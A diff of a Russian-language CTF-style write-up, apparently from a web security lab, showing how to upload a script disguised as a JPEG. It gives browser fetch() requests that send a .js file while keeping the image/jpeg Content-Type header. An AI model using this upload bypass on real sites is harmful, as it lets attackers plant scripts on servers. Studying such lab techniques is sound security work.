@@ -1,6 +1,6 @@
 # Загрузка скрипта под видом изображения
 
-На странице `http://<IP>/?page=upload` (кнопка **Add image**) можно загрузить скрипт под видом изображения.
+На странице `http://IP/?page=upload` (кнопка **Add image**) можно загрузить скрипт под видом изображения.
 Как это сделать?
 
 ## 1. Анализ допустимого формата
@@ -8,12 +8,12 @@
 Пробуем загрузить изображения разных форматов. Выясняем, что принимается формат JPEG. Смотрим, как выглядит успешный запрос:
 
 ```bash
-fetch("http://<IP>/?page=upload", {
+fetch("http://IP/?page=upload", {
   "headers": {
     "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryJvC1a8Zej7QK5Ogp",
     "upgrade-insecure-requests": "1"
   },
-  "referrer": "http://<IP>/?page=upload",
+  "referrer": "http://IP/?page=upload",
   "body": "------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"<filename>.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundaryJvC1a8Zej7QK5Ogp--\r\n",
   "method": "POST",
   "mode": "cors",
@@ -45,12 +45,12 @@ fetch("http://<IP>/?page=upload", {
 Пробуем отправить такой же запрос через консоль, сохраняем `Content-Type: image/jpeg`, но меняем тип файла на `.js`.
 
 ```bash
-const res = await fetch("http://<IP>/?page=upload", {
+const res = await fetch("http://IP/?page=upload", {
   "headers": {
     "content-type": "multipart/form-data; boundary=----WebKitFormBoundarygsnTcSeS3o1TbyAG",
     "upgrade-insecure-requests": "1"
   },
-  "referrer": "http://<IP>/?page=upload",
+  "referrer": "http://IP/?page=upload",
   "body": "------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"<filename>.js\"\r\nContent-Type: image/jpeg\r\n\r\n\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n------WebKitFormBoundarygsnTcSeS3o1TbyAG--\r\n",
   "method": "POST",
   "mode": "cors",
